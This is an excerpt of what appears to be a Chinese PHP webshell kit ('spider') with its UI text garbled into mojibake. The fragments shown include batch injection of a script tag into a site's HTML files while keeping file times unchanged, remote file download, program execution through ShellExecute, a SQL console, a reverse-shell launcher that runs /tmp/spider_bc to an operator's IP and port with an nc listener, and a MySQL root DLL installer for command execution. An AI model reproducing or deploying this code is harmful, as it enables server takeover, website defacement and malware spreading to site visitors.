...
<script type="text/javascript">
	...
	<option value="C:/Documents and Settings/All Users/¡¸¿ªÊ¼¡¹²Ëµ¥/³ÌÐò/Æô¶¯"> ËùÓÐ×éÆô¶¯Ïî </option>
	...
	<td class="toptd" style="width:48px;"> ÊôÐÔ </td>
	<td class="toptd" style="width:173px;"> ÐÞ¸ÄÊ±¼ä </td>
	<td class="toptd" style="width:75px;"> ´óÐ¡ </td></tr>
END;
...
<input type="button" value="´ò°ü" onclick="SubmitUrl('´ò°ü²¢ÏÂÔØËùÑ¡ÎÄ¼þÏÂÔØÃûÎª: ','spider.tar.gz','e');return false;"> 
Ä¿Â¼({$NUM_D}) / ÎÄ¼þ({$NUM_F})</div> 
</form> 
END;
	return true;
}
...
function autorun()
{
	...
	if(document.getElementById('gt').value == ''){alert('ÎÄ¼þÀàÐÍ²»ÄÜÎª¿Õ');return false;}
...
<div class="actall" style="height:35px;">ÎÄ¼þÀàÐÍ <input type="text" name="gt" id="gt" value=".htm|.html|.shtml" style="width:500px;">
<select onchange='return Fulll(options[selectedIndex].value)'>
...
<div class="actall" style="height:35px;">¹ýÂË¶ÔÏó <input type="text" name="gl" value="templet|templets|default|editor|fckeditor.html" style="width:500px;" disabled>
...
<div class="msgbox">¹ÒÂí±äÐÎËµÃ÷: ³ÌÐò×Ô¶¯Ñ°ÕÒ[-6-]±êÇ©,Ìæ»»ÎªËæ»ú×Ö·û,6±íÊ¾ÁùÎ»Ëæ»ú×Ö·û,×î´ó12Î»,Èç¹û²»±äÐÎ¿ÉÒÔ²»¼Ó[-6-]±êÇ©.
<br>¹ÒÉÏÊ¾Àý: &lt;script language=javascript src="http://www.baidu.com/ad.js?EMTDSU"&gt;&lt;/script&gt;</div></div>
<div class="actall" style="height:35px;"><input type="radio" name="gi" value="a" checked>²åÈë&lt;/head&gt;±êÇ©Ö®Ç° 
<input type="radio" name="gi" value="b">²åÈëÎÄ¼þ×î¶¥¶Ë 
<input type="radio" name="gi" value="c">²åÈëÎÄ¼þ×îÄ©Î²</div>
<div class="actall" style="height:30px;"><input type="checkbox" name="gx" value="1" checked>ÖÇÄÜ¹ýÂËÖØ¸´´úÂë <input type="checkbox" name="gd" value="1" checked>±£³ÖÎÄ¼þÐÞ¸ÄÊ±¼ä²»±ä</div>
<div class="actall" style="height:50px;"><input type="radio" name="gb" value="a" checked>½«¹ÒÂíÓ¦ÓÃÓÚ¸ÃÎÄ¼þ¼Ð,×ÓÎÄ¼þ¼ÐºÍÎÄ¼þ
<br><input type="radio" name="gb" value="b">½ö½«¹ÒÂíÓ¦ÓÃÓÚ¸ÃÎÄ¼þ¼Ð</div>
...
function autoup(){
	...
	if(document.getElementById('qt').value == ''){alert('ÎÄ¼þÀàÐÍ²»ÄÜÎª¿Õ');return false;}
	if(document.getElementById('qc').value == ''){alert('Çå³ý´úÂë²»ÄÜÎª¿Õ');return false;}
...
<div class="actall" style="height:35px;">ÎÄ¼þÀàÐÍ <input type="text" name="qt" id="qt" value=".htm|.html|.shtml" style="width:500px;">
<select onchange='return Fullll(options[selectedIndex].value)'>
<option value="0" selected>--ÀàÐÍÑ¡Ôñ--</option>
<option value="3">¾²Ì¬ÎÄ¼þ</option>
<option value="4">½Å±¾+¾²Ì¬</option>
...
<div class="actall">Çå³ý´úÂë <textarea name="qc" id="qc" style="width:610px;height:180px;">&lt;script language=javascript src="http://www.baidu.com/ad.js"&gt;&lt;/script&gt;</textarea></div>
<div class="actall" style="height:30px;"><input type="checkbox" name="qd" value="1" checked>±£³ÖÎÄ¼þÐÞ¸ÄÊ±¼ä²»±ä</div>
<div class="actall" style="height:50px;"><input type="radio" name="qb" value="a" checked>½«ÇåÂíÓ¦ÓÃÓÚ¸ÃÎÄ¼þ¼Ð,×ÓÎÄ¼þ¼ÐºÍÎÄ¼þ
<br><input type="radio" name="qb" value="b">½ö½«ÇåÂíÓ¦ÓÃÓÚ¸ÃÎÄ¼þ¼Ð</div>
...
function autoup(){
	...
	if(document.getElementById('tt').value == ''){alert('ÎÄ¼þÀàÐÍ²»ÄÜÎª¿Õ');return false;}
	if(document.getElementById('tca').value == ''){alert('Ìæ»»´úÂë²»ÄÜÎª¿Õ');return false;}
...
function Info_f()
{
	...
	$info = array(
		array("·þÎñÆ÷Ê±¼ä",date("YÄêmÔÂdÈÕ h:i:s",time())),
		...
		array("³ÌÐò×î¶àÔÊÐíÊ¹ÓÃÄÚ´æÁ¿ memory_limit",Info_Cfg("memory_limit")),
		array("POST×î´ó×Ö½ÚÊý post_max_size",Info_Cfg("post_max_size")),
		array("ÔÊÐí×î´óÉÏ´«ÎÄ¼þ upload_max_filesize",$upsize),
		array("³ÌÐò×î³¤ÔËÐÐÊ±¼ä max_execution_time",Info_Cfg("max_execution_time")."Ãë"),
		array("±»½ûÓÃµÄº¯Êý disable_functions",$dis_func),
		...
		array("Ñ¹ËõÎÄ¼þÖ§³Ö(Zlib)",Info_Fun("gzclose")),
...
<div class="actall">ÏÂÔØµ½ <input name="dpath" value="{$Com_dpath}" type="text" style="width:600px;"></div>
...
END;
	if((!empty($_POST['durl'])) && (!empty($_POST['dpath'])))
	{
		...
		if(!$contents) echo 'ÎÞ·¨¶ÁÈ¡ÒªÏÂÔØµÄÊý¾Ý';
		else echo File_Write($_POST['dpath'],$contents,'wb') ? 'ÏÂÔØÎÄ¼þ³É¹¦' : 'ÏÂÔØÎÄ¼þÊ§°Ü';
		echo '</div>';
	}
}
...
print<<<END
<div class="actall">³ÌÐòÂ·¾¶ <input type="text" name="run" value="{$run}" style="width:600px;"></div>
...
END;
	if(!empty($_POST['run']))
	{
		...
		echo (@$shell->ShellExecute($run,'/c '.$cmd) == '0') ? 'Ö´ÐÐ³É¹¦' : 'Ö´ÐÐÊ§°Ü';
		@$shell->Release();
		$shell = NULL;
		echo '</div>';
	}
...
function hFull(i){
	...
	Str[4] = "Provider=MSDAORA.1;Password=ÃÜÂë;User ID=ÕÊºÅ;Data Source=·þÎñÃû;Persist Security Info=True;";
...
<option value="0" selected>--Á¬½ÓÊ¾Àý--</option>
...
<option value="6">ÏÔÊ¾Êý¾Ý</option>
<option value="7">Ìí¼ÓÊý¾Ý</option>
<option value="8">É¾³ýÊý¾Ý</option>
<option value="9">ÐÞ¸ÄÊý¾Ý</option>
<option value="10">½¨Êý¾Ý±í</option>
<option value="11">É¾Êý¾Ý±í</option>
<option value="12">Ìí¼Ó×Ö¶Î</option>
<option value="13">É¾³ý×Ö¶Î</option>
</select></div>
...
END;
	if(!empty($string))
	{
		...
		echo $result ? $sql.' Ö´ÐÐ³É¹¦<br>' : $sql.' Ö´ÐÐÊ§°Ü<br>';
...
<div class="actall">Ö´ÐÐ·½Ê½ <select name="use" >
<option value="perl">perl</option>
<option value="c">c</option>
</select></div>
<div class="actall"><input type="submit" value="¿ªÊ¼Á¬½Ó" style="width:80px;"></div></form>
END;
	if((!empty($_POST['yourip'])) && (!empty($_POST['yourport'])))
	{
		...
		if($_POST['use'] == 'perl')
		{
			...
			echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : 'Ö´ÐÐÃüÁîÊ§°Ü';
		}
		if($_POST['use'] == 'c')
		{
			...
			echo Exec_Run('/tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : 'Ö´ÐÐÃüÁîÊ§°Ü';
		}
...
function Mysql_m()
{
	$MSG_BOX = 'ÇëÏÈµ¼³öDLL,ÔÙÖ´ÐÐÃüÁî.MYSQLÓÃ»§±ØÐëÎªrootÈ¨ÏÞ,µ¼³öÂ·¾¶±ØÐëÄÜ¼ÓÔØDLLÎÄ¼þ.';
	$info = 'ÃüÁî»ØÏÔ';
			...
			if((!empty($_POST['outdll'])) && (!empty($_POST['mpath'])))
			{
				...
				if(@mysql_query($query,$conn))
				{
					...
					if(@mysql_query($query,$conn))
					{
						...
						else $MSG_BOX = 'µ¼³öDLLÎÄ¼þÊ§°Ü';
					}
					else $MSG_BOX = 'Ð´ÈëÁÙÊ±±íÊ§°Ü';
...
¿É¼ÓÔØÂ·¾¶ <input type="text" name="mpath" value="{$mpath}" style="width:555px"> 
<input type="submit" name="outdll" value="°²×°DLL" style="width:80px;"></div>
<div class="actall">°²×°³É¹¦ºó¿ÉÓÃ <br><input type="text" name="sqlcmd" value="{$sqlcmd}" style="width:515px;">
			...
			<div style="height:546px;">
				...
				<td width="140" align="center" valign="top">
					<ul class="listbg">
						...
						<li><a href="?s=e" id="t_4" onclick="switchTab('t_4')" target="main"> É¨ÃèÄ¾Âí </a></li>
						<li><a href="?s=f" id="t_5" onclick="switchTab('t_5')" target="main"> ÏµÍ³ÐÅÏ¢ </a></li>
						...
						<li><a href="?s=i" id="t_8" onclick="switchTab('t_8')" target="main"> É¨Ãè¶Ë¿Ú </a></li>
